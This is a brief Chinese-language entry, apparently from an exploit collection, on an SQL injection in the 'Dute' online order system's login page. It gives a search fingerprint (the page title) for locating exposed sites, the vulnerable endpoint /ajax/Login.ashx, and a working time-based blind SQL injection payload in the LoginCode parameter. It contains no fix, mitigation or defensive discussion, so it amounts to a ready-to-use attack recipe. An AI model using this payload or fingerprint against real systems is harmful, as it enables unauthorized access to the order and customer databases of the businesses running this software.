# 杜特网上订单系统SQL注入漏洞

杜特网上订单系统 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎登陆到网上订单系统"`
- **请求**：`POST /ajax/Login.ashx HTTP/1.1`

**Payload**
```
LoginCode=admin';WAITFOR+DELAY'0:0:5'--+&Password=admin&ckRemember=0
```